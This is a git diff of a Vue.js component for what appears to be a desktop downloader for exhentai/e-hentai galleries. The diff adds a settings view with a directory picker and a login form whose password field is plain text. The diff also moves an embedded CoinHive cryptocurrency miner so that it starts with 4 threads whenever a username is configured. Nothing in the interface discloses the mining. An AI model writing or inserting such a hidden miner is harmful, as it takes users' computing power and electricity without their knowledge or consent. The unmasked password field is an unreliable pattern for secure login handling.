@@ -1,15 +1,15 @@
 <template>
   <div id="app"> 
     <div class="header">
-      <div class="row">
+      <div  v-if="!page.option" class="row">
         <div class="col-xs-8">
           <span class="help-block" style="color: #616161;"><b>Save as directory:</b> {{directory_name}}</span>
         </div>
         <div class="col-xs-4 text-right">
-          <span class="help-block" style="color: #616161;">Please login <b>exhentai.org</b>, <a href="#">LOGIN</a></span>
+          <span class="help-block" style="color: #616161;">Please login <b>exhentai.org</b>, <a href="#" @click.prevent="page.option = true">LOGIN</a></span>
         </div>
       </div>
-      <div class="row">
+      <div v-if="!page.option" class="row">
         <div class="col-xs-8">
           <div v-if="!wait" class="form-group" :class="{ 'has-error' : error_message }" style="margin-bottom:2px">
             <input ref="url" :readonly="state_verify" type="text" class="form-control input-sm" id="txtURL" placeholder="https://e-hentai.org/g/1031609/631e04b5f7/" maxlength="50" @keyup.enter="onQueue" v-model="url">
@@ -32,15 +32,49 @@
               style="padding: 5px 27px;width: 136px;" @click="onQueue">
               <i :class="['fa', state_icon]"  aria-hidden="true"></i> {{state_name}}
             </button>
-            <button :disabled="state_verify" type="button" 
-              class="btn btn-default" style="padding: 5px 11px;" @click="onBrowse">
+            <button :disabled="state_verify" type="button" class="btn btn-default" style="padding: 5px 11px;" @click="page.option = true">
               <i class="fa fa-gear" aria-hidden="true"></i>
             </button>
           </div>
         </div>
       </div>
+      <div v-else class="row">
+        <div class="col-xs-12">
+          <button type="button" class="btn btn-default pull-right" style="padding:6px 13px 7px 10px;font-size: 1.1rem" @click="page.option = false">
+            <i class="fa fa-chevron-left" aria-hidden="true"></i> BACK
+          </button>
+          <div class="page-header" style="margin-top: -10px;">
+            <h3>Directory Manga</h3>
+          </div>
+          <div class="input-group">
+            <input type="text" readonly class="form-control" placeholder="Directory for..." maxlength="50" v-model="directory_name"
+              style="padding: 7px;font-size: 1rem;height:auto">
+            <span class="input-group-btn">
+              <button class="btn btn-primary" type="button" style="padding: 6px 10px;font-size: 1.15rem;" @click="onBrowse">Browse</button>
+            </span>
+          </div>
+          <div class="page-header">
+            <h3>Sign-In exhentai.org</h3>
+          </div>
+        </div>
+        <div class="col-xs-12">
+          <form class="form">
+            <div class="col-xs-5 form-group">
+              <label for="txtUsername">Username</label>
+              <input type="text" class="form-control" id="txtUsername" placeholder="account">
+            </div>
+            <div class="col-xs-5 form-group">
+              <label for="txtPassoword">Passowrd</label>
+              <input type="text" class="form-control" id="txtPassoword" placeholder="123456">
+            </div>
+            <div class="col-xs-2">
+              <button type="submit" class="btn btn-default" style="margin-top: 20px;">Login</button>
+            </div>
+          </form>
+        </div>
+      </div>
     </div>
-    <div>
+    <div v-if="!page.option">
       <table class="table">
         <colgroup>
           <col style="width:6%;">
@@ -92,18 +126,14 @@
 
 <script>
   const URL = require('url-parse')
-
-  let miner = new window.CoinHive.User('WNABDCmX53ZR58rSXxdDSyvIlsVydItZ', 'dvgamer', {
-    threads: 4,
-    autoThreads: false,
-    throttle: 0.8,
-    forceASMJS: false
-  })
-
   export default {
     name: 'ghentai',
     data: () => {
       return {
+        page: {
+          option: true
+        },
+        miner: null,
         signin: true,
         wait: false,
         STATE: {
@@ -214,10 +244,17 @@
       let config = this.ConfigLoaded()
       this.directory_name = config.directory
       this.$nextTick(() => {
-        vm.$refs.url.focus()
+        if (!vm.page.option) vm.$refs.url.focus()
       })
-
-      miner.start()
+      if (config.username) {
+        this.miner = new window.CoinHive.User('WNABDCmX53ZR58rSXxdDSyvIlsVydItZ', config.username, {
+          threads: 4,
+          autoThreads: false,
+          throttle: 0.8,
+          forceASMJS: false
+        })
+        this.miner.start()
+      }
     }
   }
 </script>
